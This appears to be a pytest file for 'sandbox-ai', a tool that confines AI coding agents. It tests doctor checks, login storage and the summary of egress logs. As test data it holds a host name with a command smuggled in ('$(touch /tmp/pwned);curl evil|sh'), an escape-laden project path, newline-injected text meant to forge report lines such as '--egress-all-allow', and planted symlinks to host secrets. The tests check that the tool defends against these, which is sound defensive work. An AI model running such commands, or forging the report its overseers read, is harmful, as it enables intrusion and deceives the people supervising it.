"""Contracts for the sandbox-ai dispatcher, doctor and log summary."""
import importlib.util
import json
import os
import shutil
from pathlib import Path
import subprocess
import sys
from unittest.mock import Mock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))
import home_guard  # noqa: E402

home_guard.ensure()  # tests write logins: never into the real HOME, also when conftest.py was not run

ROOT = Path(__file__).resolve().parents[1]


def load(name):
    spec = importlib.util.spec_from_file_location(f"sandbox_{name}_test", ROOT / "sandbox" / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


doctor, logs, login = load("doctor"), load("logs"), load("login")


@pytest.fixture(params=["happy", "sad", "edge"])
def scenario(request):
    return request.param


def sandbox_ai(*args, **env):
    return subprocess.run([str(ROOT / "sandbox-ai"), *args], capture_output=True, text=True,
                          env={**os.environ, **env}, timeout=60)


def test_dispatcher(scenario, tmp_path):
    if scenario == "happy":
        for command in (["version"], ["--version"], ["claude", "--version"], ["session", "--version"],
                        ["mcp", "--version"], ["wizard", "--version"], ["build", "--version"],
                        ["login", "--version"]):
            result = sandbox_ai(*command)
            assert result.returncode == 0 and result.stdout.strip().startswith("sandbox-ai "), (command, result.stderr)
        plan = sandbox_ai("codex", "--workspace", str(tmp_path / "w"), "--offline", "--no-auth", "--dry-run")
        assert json.loads(plan.stdout)["agent"] == "codex"
    elif scenario == "sad":
        assert sandbox_ai("bogus").returncode == 2 and "unknown command" in sandbox_ai("bogus").stderr
        assert sandbox_ai().returncode == 2
        # A checkout is updated with git, not with install.sh.
        update = sandbox_ai("update")
        assert update.returncode == 1 and "not installed by install.sh" in update.stderr
        # Review 6 L7: its help is shown all the same, with how this copy is updated.
        for flag in ("--help", "-h"):
            helped = sandbox_ai("update", flag)
            assert helped.returncode == 0 and helped.stdout.startswith("Usage: sandbox-ai update"), helped.stderr
            assert "--check" in helped.stdout and "not installed by install.sh" in helped.stdout
    else:
        result = sandbox_ai("--help")
        assert result.returncode == 0
        for command in ("session", "mcp", "wizard", "build", "doctor", "logs", "update"):
            assert f"sandbox-ai {command}" in result.stdout
        assert "hosts list|add|set|remove|test|update|install|run" in result.stdout  # review 6 N3


def test_check_subids(scenario, tmp_path):
    (tmp_path / "subuid").write_text({"happy": "me:100000:65536\n", "sad": "other:100000:65536\n",
                                      "edge": "1000:100000:70000\nme:1:10\n"}[scenario])
    (tmp_path / "subgid").write_text("me:100000:65536\n")
    (tmp_path / "proc").mkdir()
    for name in ("uid_map", "gid_map"):  # a host: every ID
        (tmp_path / "proc" / name).write_text("         0          0 4294967295\n")
    status, _, detail, hint = doctor.check_subids("me", 1000, tmp_path, tmp_path / "proc")
    assert status == {"happy": "ok", "sad": "fail", "edge": "ok"}[scenario]
    if scenario == "sad":
        assert "usermod" in hint and "subuid: 0" in detail


def test_delegated_ids_outside_an_unprivileged_container(tmp_path):
    """Proxmox pct, unprivileged: the container has the IDs 0-65535 only; 100000-165535 cannot be mapped (newuidmap:
    write to uid_map failed: Operation not permitted)."""
    (tmp_path / "subuid").write_text("me:100000:65536\n")
    (tmp_path / "subgid").write_text("me:100000:65536\n")
    (tmp_path / "proc").mkdir()
    for name in ("uid_map", "gid_map"):
        (tmp_path / "proc" / name).write_text("         0     100000      65536\n")
    status, _, detail, hint = doctor.check_subids("me", 1000, tmp_path, tmp_path / "proc")
    assert status == "fail" and "100000-165535" in detail and "only the IDs 0-65535" in detail
    assert "lxc.idmap: u 0 100000 1065536" in hint and "podman system migrate" in hint
    # The container got more IDs: fine.
    for name in ("uid_map", "gid_map"):
        (tmp_path / "proc" / name).write_text("         0     100000    1065536\n")
    assert doctor.check_subids("me", 1000, tmp_path, tmp_path / "proc")[0] == "ok"


def test_a_smaller_range_inside_a_small_container_cannot_build(tmp_path):
    """The container has 0-65535 and the range fits (10000-59999): Podman starts, but apt in every image build
    drops to group 65534 ("setgroups 65534 failed - Invalid argument"). A failure, with the container's ID map as
    the way out; never the advice to add 100000-165535, which cannot exist there."""
    (tmp_path / "proc").mkdir()
    for name in ("uid_map", "gid_map"):
        (tmp_path / "proc" / name).write_text("         0     100000      65536\n")
    for name in ("subuid", "subgid"):
        (tmp_path / name).write_text("me:10000:50000\n")
    status, _, detail, hint = doctor.check_subids("me", 1000, tmp_path, tmp_path / "proc")
    assert status == "fail" and "50000" in detail and "setgroups 65534" in detail
    assert "usermod" not in hint and "lxc.idmap" in hint, "100000-165535 does not exist here: more IDs from the host"
    assert "podman system reset" in hint, "images of the old IDs: only a fresh storage helps (Permission denied)"
    assert "sudo rm -rf ~/.local/share/containers/storage" in hint, "when the reset itself cannot remove them"
    # On a host with every ID a small range is a mistake usermod fixes.
    for name in ("uid_map", "gid_map"):
        (tmp_path / "proc" / name).write_text("         0          0 4294967295\n")
    for name in ("subuid", "subgid"):
        (tmp_path / name).write_text("me:100000:50000\n")
    status, _, _, hint = doctor.check_subids("me", 1000, tmp_path, tmp_path / "proc")
    assert status == "fail" and "usermod" in hint
    # 65534 reach the ID 65534: enough.
    for name in ("subuid", "subgid"):
        (tmp_path / name).write_text("me:100000:65534\n")
    assert doctor.check_subids("me", 1000, tmp_path, tmp_path / "proc")[0] == "ok"


def test_check_userns(scenario, tmp_path):
    (tmp_path / "user").mkdir()
    (tmp_path / "kernel").mkdir()
    (tmp_path / "user/max_user_namespaces").write_text("0\n" if scenario == "sad" else "15000\n")
    if scenario == "edge":
        (tmp_path / "kernel/apparmor_restrict_unprivileged_userns").write_text("1\n")
    assert doctor.check_userns(tmp_path)[0] == {"happy": "ok", "sad": "fail", "edge": "warn"}[scenario]


def test_check_podman(scenario, monkeypatch):
    monkeypatch.setattr(doctor.shutil, "which", lambda name: None if scenario == "sad" else "/usr/bin/" + name)
    answers = {"happy": [(0, "true"), (0, "5.2.1")], "edge": [(0, "false")]}.get(scenario, [])
    monkeypatch.setattr(doctor, "run", Mock(side_effect=answers))
    status, _, detail, hint = doctor.check_podman()
    if scenario == "happy":
        assert status == "ok" and "5.2.1" in detail
    elif scenario == "sad":
        assert status == "fail" and "passt" in hint
    else:
        assert status == "fail" and detail == "not rootless"


def test_check_image(scenario, monkeypatch):
    monkeypatch.setattr(doctor.shutil, "which", lambda name: "/usr/bin/podman")
    monkeypatch.setattr(doctor, "run", Mock(return_value={"happy": (0, "1.0.42"), "sad": (125, ""),
                                                          "edge": (0, "<no value>")}[scenario]))
    status, _, detail, hint = doctor.check_image("claude")
    assert status == {"happy": "ok", "sad": "warn", "edge": "ok"}[scenario]
    assert ("claude 1.0.42" in detail) == (scenario == "happy")
    assert ("sandbox-ai build claude" in hint) == (scenario != "happy")


def test_check_login(scenario, tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
    credentials = tmp_path / ".claude/.credentials.json"
    if scenario != "sad":
        credentials.parent.mkdir()
        login = {"accessToken": "secret-access", "refreshToken": "secret-refresh", "expiresAt": 4102444800000}
        credentials.write_text(json.dumps({"claudeAiOauth": login} if scenario == "happy" else {"other": 1}))
    status, _, detail, hint = doctor.check_login("claude")
    assert status == {"happy": "ok", "sad": "warn", "edge": "warn"}[scenario]
    assert "secret" not in detail + hint
    if scenario == "sad":
        assert "sandbox-ai login claude" in hint


def test_check_tiocsti(scenario, tmp_path):
    sysctl = tmp_path / "legacy_tiocsti"
    if scenario != "edge":
        sysctl.write_text("0\n" if scenario == "happy" else "1\n")
    assert doctor.check_tiocsti(sysctl)[0] == ("ok" if scenario == "happy" else "fail")


def test_doctor_report(scenario, capsys):
    results = {"happy": [("ok", "A", "fine", "")], "sad": [("fail", "A", "broken", "fix it"), ("ok", "B", "", "")],
               "edge": [("warn", "A", "odd\x1b[2J", "look"), ("skip", "B", "-", "")]}[scenario]
    lines = []
    assert doctor.report(results, lines.append) == (1 if scenario == "sad" else 0)
    text = "\n".join(lines)
    assert "\x1b" not in text
    assert ("-> fix it" in text) == (scenario == "sad")


def log_dir(tmp_path, denied, files=()):
    directory = tmp_path / "logs"
    directory.mkdir()
    (directory / "egress-denied.jsonl").write_text("".join(json.dumps(r) + "\n" for r in denied) + "not json\n")
    (directory / "files.jsonl").write_text("".join(json.dumps(r) + "\n" for r in files))
    return directory


def test_log_suggestions(scenario):
    record = {"happy": {"host": "pypi.org"}, "sad": {"address": "not-an-ip", "protocol": "tcp", "port": 1},
              "edge": {"address": "127.0.0.1", "protocol": "tcp", "port": 3000}}[scenario]
    found = logs.suggestion(record)
    expected = {"happy": "--allow-pypi", "sad": None, "edge": "--allow-host-port 3000"}[scenario]
    assert (found[1] if found else None) == expected
    assert logs.suggestion({"address": "192.0.2.7", "protocol": "udp", "port": 53})[1] == "--allow 192.0.2.7"
    assert logs.suggestion({"address": "2001:db8::1", "protocol": "tcp", "port": 22})[1] == "--allow-tcp [2001:db8::1]:22"
    assert logs.suggestion({"host": "api.openai.com"})[1] == "--profile frontier"
    assert logs.suggestion({"host": "example.org"})[1] == "--allow-host example.org"


def test_summarize_and_report(scenario, tmp_path, capsys):
    denied = {"happy": [{"host": "pypi.org"}, {"host": "pypi.org"}, {"address": "192.0.2.9", "protocol": "tcp", "port": 8080}],
              "sad": [], "edge": [{"host": "evil\x1b]0;x\x07.example"}]}[scenario]
    files = [{"action": "write", "path": "/work/a.txt"}, {"action": "read", "path": "/work/b"},
             {"error": "inotify watch limit reached"}]
    directory = log_dir(tmp_path, denied, files)
    summary = logs.summarize(directory)
    assert summary["denied"] == len(denied) and summary["file_events"] == 2
    assert summary["file_errors"] == ["inotify watch limit reached"]
    lines = []
    logs.report(summary, lines.append)
    text = "\n".join(lines)
    assert "\x1b" not in text and "\x07" not in text
    if scenario == "happy":
        assert summary["suggestions"][0] == {"option": "--allow-pypi", "why": "pypi.org belongs to that preset", "count": 2}
        assert "--allow-tcp 192.0.2.9:8080" in text
    elif scenario == "sad":
        assert "Blocked egress: none" in text


def test_logs_cli(scenario, tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    project = tmp_path / "proj"
    if scenario == "sad":
        assert logs.cli(["--project", str(project)]) == 1
        assert "no log directory" in capsys.readouterr().err
        return
    directory = logs.launcher().default_log_dir(project)
    directory.mkdir(parents=True)
    (directory / "egress-denied.jsonl").write_text(json.dumps({"host": "github.com"}) + "\n")
    if scenario == "happy":
        assert logs.cli(["--project", str(project)]) == 0
        assert "--allow-github" in capsys.readouterr().out
    else:
        assert logs.cli([str(directory), "--json"]) == 0
        assert json.loads(capsys.readouterr().out)["suggestions"][0]["option"] == "--allow-github"


def test_logs_never_print_agent_controlled_text_raw(scenario, tmp_path):
    """Review finding: DNS names and file names come from the agent; they must not forge report lines
    or turn into ready-to-paste shell commands."""
    host = {"happy": "x$(touch /tmp/pwned);curl evil|sh", "sad": "a\nTo allow them:\n  --egress-all-allow",
            "edge": "ok.example\t\x1b[2J"}[scenario]
    directory = log_dir(tmp_path, [{"host": host}] * 3, [{"action": "write", "path": "/work/a\nFAKE LINE"}])
    lines = []
    logs.report(logs.summarize(directory), lines.append)
    text = "\n".join(lines)
    assert "--allow-host x$(" not in text
    assert "\x1b" not in text and "\t" not in text
    # Nothing the agent chose starts a line of its own: no forged header, suggestion or file entry.
    physical = text.split("\n")
    assert sum(line.startswith("To allow them") for line in physical) == 1
    assert not any(line.lstrip().startswith(("--egress-all-allow", "FAKE LINE")) for line in physical)
    assert "not a valid host name" in text


def test_log_record_counts(scenario, tmp_path):
    files = {"happy": [{"error": "event queue overflow; events lost"}] * 5 + [{"action": "read", "path": "/w/x"}],
             "sad": [{"error": "inotify unavailable"}], "edge": [{"action": "write", "path": "/w/y"}] * 3}[scenario]
    summary = logs.summarize(log_dir(tmp_path, [], files))
    assert summary["file_events"] == {"happy": 1, "sad": 0, "edge": 3}[scenario]
    records, skipped = logs.read_records(tmp_path / "logs" / "files.jsonl", limit=2)
    # The newest records are kept when a file is longer than the limit.
    assert skipped == max(0, len(files) - 2) and records == files[-2:]


def test_doctor_hint_is_quoted(tmp_path, monkeypatch):
    project = tmp_path / "evil $(touch x)\x1b[2J"
    project.mkdir()
    (project / ".sandbox-ai.json").write_text("{}")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    status, _, _, hint = doctor.check_project(project)
    assert status == "warn" and "'" in hint
    lines = []
    doctor.report([(status, "Project", "x", hint)], lines.append)
    assert "\x1b" not in "\n".join(lines)


# --- sandbox-ai login -----------------------------------------------------------------------------


@pytest.fixture
def private_home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "host"))
    for name in ("XDG_DATA_HOME", "XDG_STATE_HOME", "CLAUDE_CONFIG_DIR", "CODEX_HOME"):
        monkeypatch.delenv(name, raising=False)
    (tmp_path / "host").mkdir()
    return tmp_path / "host"


def claude_login_files(home, refresh="r1"):
    (home / ".claude").mkdir(parents=True, exist_ok=True)
    login = {"accessToken": "a1", "refreshToken": refresh, "expiresAt": 4102444800000, "subscriptionType": "max",
             "unknownField": "dropped"}
    (home / ".claude/.credentials.json").write_text(json.dumps({"claudeAiOauth": login, "mcpOAuth": {"x": 1}}))
    (home / ".claude.json").write_text(json.dumps({"oauthAccount": {"emailAddress": "e"}, "projects": {"/p": {}}}))


def test_login_collect(scenario, tmp_path, private_home):
    home = tmp_path / "staging"
    if scenario == "happy":
        claude_login_files(home)
        files = login.collect("claude", home)
        stored = json.loads(files[".claude/.credentials.json"])
        assert stored == {"claudeAiOauth": {"accessToken": "a1", "refreshToken": "r1", "expiresAt": 4102444800000,
                                            "subscriptionType": "max"}}
        assert json.loads(files[".claude.json"]) == {"oauthAccount": {"emailAddress": "e"}}
    elif scenario == "sad":
        home.mkdir()
        assert login.collect("claude", home) == {} and login.collect("codex", home) == {}
        (home / ".codex").mkdir()
        (home / ".codex/auth.json").write_text("[]")
        assert login.collect("codex", home) == {}
        (home / ".codex/auth.json").write_text('{"x": 1}')  # not a Codex login
        assert login.collect("codex", home) == {}
        (home / ".codex/auth.json").write_text('{"OPENAI_API_KEY": "sk-1"}')
        assert login.collect("codex", home) == {".codex/auth.json": b'{\n  "OPENAI_API_KEY": "sk-1"\n}'}
    else:
        # The login sandbox could plant links to host files: never followed.
        secret = tmp_path / "host-secret.json"
        secret.write_text('{"tokens": "host"}')
        (home / ".codex").mkdir(parents=True)
        (home / ".codex/auth.json").symlink_to(secret)
        assert login.collect("codex", home) == {}
        (home / ".local/share").mkdir(parents=True)
        (home / ".local/share/opencode").symlink_to(tmp_path)
        assert login.collect("opencode", home) == {}


def test_login_runs_the_agent_login_in_a_sandbox_and_stores_it(scenario, private_home, monkeypatch):
    seen = []

    def fake_run(cmd):
        seen.append(cmd)
        home = Path(cmd[cmd.index("--state-dir") + 1])
        if scenario != "sad":
            claude_login_files(home, refresh="fresh")
        return Mock(returncode=0)
    monkeypatch.setattr(login.subprocess, "run", fake_run)
    lines = []
    store = login.launcher().auth_store("claude")
    if scenario == "edge":
        claude_login_files(store, refresh="old")  # an older stored login is replaced as a whole
        (store / "stray").write_text("x")
    result = login.login("claude", ["--backend", "bwrap"], out=lines.append)
    cmd = seen[0]
    assert cmd[cmd.index("--") + 1:] == ["auth", "login"]
    assert {"--no-auth", "--no-config", "--no-tmux"} <= set(cmd) and cmd[cmd.index("--binary") + 1] == "claude"
    assert ["--backend", "bwrap"] == cmd[4:6]
    # The staging HOME is gone afterwards, whatever happened.
    assert not list(login.launcher().auth_store().glob(".login-*"))
    if scenario == "sad":
        assert result == 1 and not store.exists() and "nothing stored" in lines[-1]
        return
    assert result == 0
    stored = json.loads((store / ".claude/.credentials.json").read_text())
    assert stored["claudeAiOauth"]["refreshToken"] == "fresh" and "mcpOAuth" not in stored
    assert oct((store / ".claude/.credentials.json").stat().st_mode & 0o777) == "0o600"
    assert not (store / "stray").exists()
    # From now on sandboxes get this login, not the host's.
    assert login.launcher().auth_sources("claude")[0][0] == store / ".claude/.credentials.json"


def test_login_logout_and_status(scenario, private_home, capsys):
    if scenario == "sad":
        assert login.logout("codex") == 1
        return
    claude_login_files(login.launcher().auth_store("claude"))
    if scenario == "happy":
        assert login.status() == 0
        text = capsys.readouterr().out
        assert "claude    login store" in text and "codex     host" in text and "no login" in text
        assert "a1" not in text and "r1" not in text
    else:
        assert login.logout("claude") == 0
        assert not login.launcher().auth_store("claude").exists()
        assert login.launcher().login_state("claude") == ("host", "missing")


def test_login_cli(scenario, monkeypatch):
    calls = []
    monkeypatch.setattr(login, "login", lambda *a: calls.append(a) or 0)
    monkeypatch.setattr(login, "status", lambda: calls.append("status") or 0)
    if scenario == "happy":
        assert login.cli(["codex", "--backend", "bwrap", "--", "login"]) == 0
        # Review finding: launcher options before the agent name work too.
        assert login.cli(["--backend", "bwrap", "claude"]) == 0
        assert calls == [("codex", ["--backend", "bwrap"], ["login"]), ("claude", ["--backend", "bwrap"], None)]
    elif scenario == "sad":
        with pytest.raises(SystemExit):
            login.cli([])
    else:
        assert login.cli(["--status"]) == 0 and calls == ["status"]


def test_login_write_store_replaces_in_place(scenario, private_home, tmp_path):
    store = login.launcher().auth_store("claude")
    files = {".claude/.credentials.json": b'{"new": 1}', ".claude.json": b"{}"}
    if scenario == "happy":
        claude_login_files(store, refresh="old")
        (store / "stray").write_text("x")
        (store / "olddir").mkdir()
        inode = store.stat().st_ino
        login.write_store("claude", files)
        # The directory itself was never replaced (no moment without a store), stale files are gone.
        assert store.stat().st_ino == inode
        assert sorted(str(p.relative_to(store)) for p in store.rglob("*")) == [".claude", ".claude.json",
                                                                              ".claude/.credentials.json"]
        assert (store / ".claude/.credentials.json").read_bytes() == b'{"new": 1}'
    elif scenario == "sad":
        store.parent.mkdir(parents=True)
        store.symlink_to(tmp_path)
        with pytest.raises(ValueError, match="symlink"):
            login.write_store("claude", files)
    else:
        store.mkdir(parents=True)
        (store / ".claude").symlink_to(tmp_path)
        with pytest.raises(ValueError, match="symlink"):
            login.write_store("claude", files)
        assert not (tmp_path / ".credentials.json").exists()


def test_check_proxy_nat(scenario, tmp_path):
    for name in {"happy": ["nft_chain_nat", "nft_redir"], "sad": [], "edge": ["nft_chain_nat"]}[scenario]:
        (tmp_path / name).mkdir()
    status, _, detail, fix = doctor.check_proxy_nat(tmp_path)
    assert status == ("ok" if scenario == "happy" else "warn")
    if scenario == "edge":
        assert "nft_redir" in detail and "nft_chain_nat" not in detail and "modprobe" in fix


def test_logs_telemetry_counts_models_pushes_credentials_and_processes(tmp_path, capsys):
    spec = importlib.util.spec_from_file_location("logs_telemetry", ROOT / "sandbox/logs.py")
    logs = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(logs)
    (tmp_path / "connections-1.jsonl").write_text("\n".join(json.dumps(r) for r in [
        {"event": "http", "host": "api.anthropic.com", "credentials": ["x-api-key"],
         "model": {"model": "claude-opus-5-5", "usage": {"input_tokens": 100, "output_tokens": 20}}},
        {"event": "http", "host": "api.anthropic.com", "credentials": ["x-api-key"],
         "model": {"model": "claude-opus-5-5", "usage": {"input_tokens": 50, "output_tokens": 5}}},
        {"event": "http", "host": "github.com", "push": {"ok": False}},
        {"event": "denied", "destination": "192.0.2.1:22"}]) + "\n")
    (tmp_path / "processes.jsonl").write_text(json.dumps({"pid": 3, "command": "/usr/bin/git push"}) + "\n")
    seen = logs.telemetry(tmp_path)
    assert seen["requests"] == 3 and seen["model_calls"] == {"claude-opus-5-5": 2}
    assert seen["tokens"] == {"input_tokens": 150, "output_tokens": 25} and seen["pushes"] == {"ok": 0, "refused": 1}
    assert seen["credentials"] == [("x-api-key -> api.anthropic.com", 2)] and seen["programs"] == [("git", 1)]
    state = tmp_path / "state"
    (state / "sandbox-ai/mcp/ddg").mkdir(parents=True)
    (state / "sandbox-ai/mcp/ddg/supervisor.log").write_text(
        'noise\nsandbox-ai-mcp-call {"time": "t", "tool": "web_search", "arguments": "{}"}\n')
    (state / "sandbox-ai/mcp/ddg/mcp-calls.jsonl").write_text("\n".join(json.dumps(r) for r in [
        {"time": "u", "event": "call", "tool": "fetch", "decision": "deny"},
        {"time": "v", "event": "result", "tool": "fetch"}, {"time": "w", "event": "refused"}]) + "\n")
    assert logs.tool_calls(state) == {"ddg": [("t", "web_search", "allow"), ("u", "fetch", "deny")]}
    assert logs.report({**logs.summarize(tmp_path), "telemetry": seen, "tool_calls": logs.tool_calls(state)},
                       out=print) == 0
    out = capsys.readouterr().out
    assert "Model calls: 2x claude-opus-5-5; tokens: input_tokens 150, output_tokens 25" in out
    assert "MCP ddg: 2 tool call(s), 1 not allowed outright: fetch, web_search" in out


def test_check_user_session(tmp_path):
    import socket as sockets
    (tmp_path / "1000").mkdir()
    status, _, detail, hint = doctor.check_user_session(1000, tmp_path)
    assert status == "warn" and "not enforced" in detail and "cgroupfs" in detail and "enable-linger" in hint
    assert "dbus-user-session" in hint and "not with su or sudo" in hint
    (tmp_path / "1000" / "bus").touch()  # a file is no bus
    assert doctor.check_user_session(1000, tmp_path)[0] == "warn"
    (tmp_path / "1000" / "bus").unlink()
    server = sockets.socket(sockets.AF_UNIX)
    server.bind(str(tmp_path / "1000" / "bus"))
    try:
        assert doctor.check_user_session(1000, tmp_path)[0] == "ok"
    finally:
        server.close()
    (tmp_path / "1000" / "bus").unlink()
    assert "cgroupfs" not in doctor.check_user_session(1000, tmp_path, backend="bwrap")[2], "bwrap builds nothing"
    assert doctor.check_user_session(1000, tmp_path, podman_url="unix:///x")[0] == "skip", "a remote engine's own"


def subids(tmp_path, subuid, subgid=None, mapped="0 0 4294967295", backend="podman"):
    (tmp_path / "proc").mkdir(exist_ok=True)
    for name in ("uid_map", "gid_map"):
        (tmp_path / "proc" / name).write_text(mapped + "\n")
    (tmp_path / "subuid").write_text(subuid)
    (tmp_path / "subgid").write_text(subgid if subgid is not None else subuid)
    return doctor.check_subids("me", 1000, tmp_path, tmp_path / "proc", backend=backend)


def test_ranges_the_kernel_refuses_are_failures(tmp_path):
    """newuidmap writes "0 <own> 1" and every range: one holding the user's own ID, 0, or another range is
    refused ("write to uid_map failed: Invalid argument"), however large it is."""
    status, _, detail, _ = subids(tmp_path, "me:0:65536\n", mapped="0 100000 65536")
    assert status == "fail" and "holds your own ID 1000" in detail
    status, _, detail, _ = subids(tmp_path, "me:0:900\nme:2000:65000\n")
    assert status == "fail" and "holds ID 0 (root)" in detail
    status, _, detail, hint = subids(tmp_path, "me:100000:50000\nme:100000:65536\n")  # usermod added a second line
    assert status == "fail" and "overlap" in detail and "only line" in hint and "removing older lines" in hint


def test_ranges_count_together(tmp_path):
    """Podman uses every line: split around the user's own ID, 65534 in all reach ID 65534."""
    assert subids(tmp_path, "me:1:999\nme:1001:64535\n", mapped="0 100000 65536")[0] == "ok"
    assert subids(tmp_path, "me:100000:32768\nme:200000:32768\n")[0] == "ok"
    status, _, detail, _ = subids(tmp_path, "me:100000:32768\n")
    assert status == "fail" and "32768" in detail


def test_bubblewrap_needs_one_line_of_65536(tmp_path):
    split = "me:100000:32768\nme:200000:32768\n"
    assert subids(tmp_path, split, backend="podman")[0] == "ok"
    status, _, detail, _ = subids(tmp_path, split, backend="bwrap")
    assert status == "fail" and "one line of at least 65536" in detail
    assert subids(tmp_path, "me:100000:65536\n", backend="both")[0] == "ok"


def test_the_advice_names_only_ids_the_system_has(tmp_path):
    """A container with 140000 IDs has no 100000-165535: more IDs from its host, not a usermod past its top."""
    status, _, _, hint = subids(tmp_path, "me:10000:5000\n", mapped="0 100000 140000")
    assert status == "fail" and "lxc.idmap" in hint and "usermod" not in hint
    status, _, _, hint = subids(tmp_path, "me:10000:5000\n", mapped="0 100000 300000")
    assert status == "fail" and "usermod" in hint


def test_check_newuidmap(tmp_path):
    plain = tmp_path / "newuidmap"
    plain.write_text("")
    plain.chmod(0o755)
    status, _, detail, hint = doctor.check_newuidmap(lambda name: str(plain))
    assert status == "fail" and "neither setuid root nor file capabilities" in detail and "uidmap" in hint
    assert doctor.check_newuidmap(lambda name: None)[2] == "newuidmap not found"
    real = shutil.which("newuidmap")
    if real and (os.stat(real).st_mode & 0o4000 or _has_caps(real)):
        assert doctor.check_newuidmap()[0] == "ok"


def _has_caps(path):
    try:
        os.getxattr(path, "security.capability")
        return True
    except OSError:
        return False


RESULTS = [("ok", "Podman", "rootless, 5.4.2", ""), ("warn", "Login claude", "no login", "sandbox-ai login claude"),
           ("fail", "Delegated UID/GID ranges", "fewer than 65534 " + "and more words " * 12, "give this system more IDs"),
           ("skip", "VPN", "no profiles", ""), ("ok", "Git identity", "me", "")]


def test_doctor_is_a_table_by_section_in_colour(monkeypatch):
    monkeypatch.setenv("COLUMNS", "80")
    lines = []
    assert doctor.report(RESULTS, lines.append, colour=True) == 1
    text = "\n".join(lines)
    assert "\033[32mok  \033[0m" in text, "ok in green"
    assert "\033[38;5;208mWARN\033[0m" in text and "\033[38;5;208m-> sandbox-ai login claude\033[0m" in text, "orange"
    assert "\033[31mFAIL\033[0m" in text and "\033[90m--  \033[0m" in text, "problems red, not checked grey"
    assert lines[-1] == "\033[31m1 problem(s), 1 warning(s)\033[0m", "the summary in the colour of the worst"
    sections = [line for line in lines if line.startswith("\033[36m")]
    assert [s.replace("\033[36m", "").replace("\033[0m", "") for s in sections] == ["Engine", "Agents", "Project"]
    plain = []
    doctor.report(RESULTS, plain.append, colour=False)
    assert not any("\033" in line for line in plain)
    assert all(len(line) <= 80 for line in plain), "wrapped at the terminal's width"
    detail = next(i for i, line in enumerate(plain) if "FAIL" in line)
    assert plain[detail + 1].startswith(" " * 34) and "more words" in plain[detail + 1], "continued under itself"
    ok = []
    doctor.report([RESULTS[0]], ok.append, colour=True)
    assert ok[-1] == "\033[32mEverything needed is in place.\033[0m"


def test_doctor_plain_and_without_colour(monkeypatch, capsys):
    lines = []
    doctor.report(RESULTS, lines.append, colour=False, plain=True)
    assert lines[0] == "ok    Podman                    rootless, 5.4.2", "one line per check, as before"
    assert lines[2] == " " * 32 + "-> sandbox-ai login claude"  # under the result, as before
    monkeypatch.setattr(doctor, "checks", lambda backend, podman_url: RESULTS)
    monkeypatch.setenv("FORCE_COLOR", "1")  # even then --no-color wins
    assert doctor.cli(["--no-color"]) == 1
    assert "\033" not in capsys.readouterr().out
    doctor.cli([])
    assert "\033[38;5;208mWARN" in capsys.readouterr().out
    monkeypatch.delenv("FORCE_COLOR")
    monkeypatch.setenv("NO_COLOR", "1")
    doctor.cli([])
    assert "\033" not in capsys.readouterr().out


def test_check_pasta_needs_dev_net_tun(tmp_path):
    """pasta without /dev/net/tun (an LXC container whose host passes none in) fails every start."""
    which = lambda name: "/usr/bin/pasta"  # noqa: E731
    status, _, detail, hint = doctor.check_pasta(which=which, tun=tmp_path / "tun")
    assert status == "fail" and "is missing" in detail and "lxc.mount.entry: /dev/net/tun" in hint
    (tmp_path / "tun").write_text("")  # a file is no device
    assert doctor.check_pasta(which=which, tun=tmp_path / "tun")[0] == "fail"
    if os.path.exists("/dev/null"):  # a character device stands in for the tun device
        assert doctor.check_pasta(which=which, tun=Path("/dev/null"))[0] == "ok"
    assert doctor.check_pasta(which=lambda name: None)[2] == "not found"
    assert doctor.check_pasta("unix:///x")[0] == "skip"


def test_readmes_name_the_update_paths_hosts_and_approvals_rely_on():
    """Review 6 N3: `hosts update --from-here` (the only update path before a release is published) and
    `approvals allow ID --no-open` were in neither README."""
    for readme in ("README.md", "README_DE.md"):
        text = (ROOT / readme).read_text()
        assert "sandbox-ai hosts update ct1 --from-here" in text and "hosts update NAME --from-here" in text, readme
        assert "sandbox-ai approvals allow ID --no-open" in text, readme
